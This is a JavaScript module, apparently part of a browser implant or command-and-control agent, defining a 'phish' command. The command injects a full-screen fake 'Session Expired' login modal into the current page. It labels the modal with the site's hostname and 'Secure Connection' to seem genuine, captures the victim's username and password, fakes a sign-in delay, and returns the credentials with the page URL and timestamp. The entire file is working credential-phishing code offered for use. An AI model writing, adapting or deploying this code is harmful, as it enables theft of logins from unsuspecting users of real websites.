COMMANDS['phish'] = async function(task) {
    var params = task.parameters;
    if (typeof params === 'string') {
        try { params = JSON.parse(params); } catch (e) { params = {}; }
    }
    var title = (params && params.title) ? params.title : 'Session Expired';
    var subtitle = (params && params.subtitle) ? params.subtitle : 'Your session has timed out. Please sign in again to continue.';

    // Remove existing phish overlay
    var existing = document.getElementById('__tyche_phish');
    if (existing) existing.remove();

    var captured = null;

    var overlay = document.createElement('div');
    overlay.id = '__tyche_phish';
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;' +
        'background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;' +
        'font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;';

    var modal = document.createElement('div');
    modal.style.cssText = 'background:#fff;border-radius:12px;padding:32px 40px;width:380px;max-width:90vw;' +
        'box-shadow:0 20px 60px rgba(0,0,0,0.3);color:#333;';

    // Lock icon
    var icon = document.createElement('div');
    icon.style.cssText = 'text-align:center;font-size:48px;margin-bottom:12px;';
    icon.textContent = '🔒';
    modal.appendChild(icon);

    // Title
    var h2 = document.createElement('div');
    h2.style.cssText = 'font-size:22px;font-weight:700;text-align:center;margin-bottom:8px;color:#111;';
    h2.textContent = title;
    modal.appendChild(h2);

    // Subtitle
    var sub = document.createElement('div');
    sub.style.cssText = 'font-size:14px;text-align:center;margin-bottom:24px;color:#666;line-height:1.5;';
    sub.textContent = subtitle;
    modal.appendChild(sub);

    // Username field
    var userLabel = document.createElement('div');
    userLabel.style.cssText = 'font-size:13px;font-weight:600;margin-bottom:4px;color:#444;';
    userLabel.textContent = 'Username or Email';
    modal.appendChild(userLabel);

    var userInput = document.createElement('input');
    userInput.type = 'text';
    userInput.autocomplete = 'username';
    userInput.style.cssText = 'width:100%;padding:10px 12px;border:1px solid #d0d0d0;border-radius:6px;' +
        'font-size:15px;box-sizing:border-box;margin-bottom:16px;outline:none;';
    userInput.onfocus = function() { userInput.style.borderColor = '#4a90d9'; };
    userInput.onblur = function() { userInput.style.borderColor = '#d0d0d0'; };
    modal.appendChild(userInput);

    // Password field
    var passLabel = document.createElement('div');
    passLabel.style.cssText = 'font-size:13px;font-weight:600;margin-bottom:4px;color:#444;';
    passLabel.textContent = 'Password';
    modal.appendChild(passLabel);

    var passInput = document.createElement('input');
    passInput.type = 'password';
    passInput.autocomplete = 'current-password';
    passInput.style.cssText = 'width:100%;padding:10px 12px;border:1px solid #d0d0d0;border-radius:6px;' +
        'font-size:15px;box-sizing:border-box;margin-bottom:24px;outline:none;';
    passInput.onfocus = function() { passInput.style.borderColor = '#4a90d9'; };
    passInput.onblur = function() { passInput.style.borderColor = '#d0d0d0'; };
    modal.appendChild(passInput);

    // Submit button
    var submitBtn = document.createElement('button');
    submitBtn.textContent = 'Sign In';
    submitBtn.style.cssText = 'width:100%;padding:12px;background:#4a90d9;color:#fff;border:none;' +
        'border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;';
    submitBtn.onmouseover = function() { submitBtn.style.background = '#357abd'; };
    submitBtn.onmouseout = function() { submitBtn.style.background = '#4a90d9'; };
    modal.appendChild(submitBtn);

    // Footer
    var footer = document.createElement('div');
    footer.style.cssText = 'text-align:center;margin-top:16px;font-size:12px;color:#999;';
    footer.textContent = window.location.hostname + ' • Secure Connection';
    modal.appendChild(footer);

    overlay.appendChild(modal);
    document.body.appendChild(overlay);

    // Wait for submit
    var creds = await new Promise(function(resolve) {
        function submit() {
            var u = userInput.value;
            var p = passInput.value;
            if (u || p) {
                resolve({username: u, password: p});
            }
        }
        submitBtn.onclick = function(e) { e.preventDefault(); submit(); };
        passInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') submit();
        });
    });

    // Show brief "loading" then remove
    submitBtn.textContent = 'Signing in...';
    submitBtn.style.opacity = '0.7';
    await new Promise(function(r) { setTimeout(r, 1500); });
    overlay.remove();

    return JSON.stringify({
        domain: window.location.hostname,
        url: window.location.href,
        title: title,
        username: creds.username,
        password: creds.password,
        capturedAt: new Date().toISOString()
    }, null, 2);
};
